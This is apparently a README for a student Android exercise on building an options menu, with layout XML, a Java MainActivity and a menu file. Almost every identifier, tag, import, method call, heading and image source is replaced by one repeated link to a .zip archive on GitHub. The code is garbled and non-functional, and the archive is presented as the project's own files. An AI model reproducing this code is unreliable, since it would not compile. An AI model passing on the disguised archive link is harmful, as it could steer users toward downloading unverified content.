# https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip Develop an android application to create a option menu to display menu items using android studio.


## AIM:
To create a option menu to display menu items using Android Studio.

## EQUIPMENTS REQUIRED:
Latest Version Android Studio

## ALGORITHM:
Step 1: Open Android Studio and then click on File -> New -> New project.

Step 2: Then type the Application name as HelloWorld and click Next.

Step 3: Then select the Minimum SDK as shown below and click Next.

Step 4: Then select the Empty Activity and click Next. Finally click Finish.

Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip

Step 6: Display message give in MainActivity file.

Step 7: Save and run the application.

## PROGRAM:
/*
Program to print the text “optionmenu”.
Developed by: SHAIK MUFEEZUR RAHAMAN
Registeration Number : 212221043007
*/


## https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip


```

<?xml version="1.0" encoding="utf-8"?>
<https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip"
    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip"
    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip
        android:id="@+id/toolbar"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:title="Options Menu"
        app:layout_constraintTop_toTopOf="parent"
        android:background="?android:attr/colorPrimary" />

    <TextView
        android:id="@+id/helloTextView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Hello World!"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent" />

<https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip>

```

## https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip

```

package https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;

import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(savedInstanceState);
        setContentView(https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip);

        // Set up the toolbar
        Toolbar toolbar = findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip);
        setSupportActionBar(toolbar); // Set the toolbar as the action bar
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip, menu); // Inflate the menu
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(this, "Selected Item: " + https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(), https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip).show();
        return https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip(item);
    }
}
```

## https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip

```

<?xml version="1.0" encoding="utf-8"?>
<menu xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip">
    <item
        android:id="@+id/search_item"
        android:title="@string/search" />
    <item
        android:id="@+id/upload_item"
        android:title="@string/upload" />
    <item
        android:id="@+id/copy_item"
        android:title="@string/copy" />
    <item
        android:id="@+id/print_item"
        android:title="@string/print" />
    <item
        android:id="@+id/share_item"
        android:title="@string/share" />
    <item
        android:id="@+id/bookmark_item"
        android:title="@string/bookmark" />
</menu>
```
## OUTPUT

<img src="https://raw.githubusercontent.com/githubmufeez45/Ex_10_option-menu/main/Ilongot/Ex_10_option-menu.zip" width=200>


## RESULT

The application successfully displays an options menu with various items, and upon selecting any item, a toast message shows the selected item.
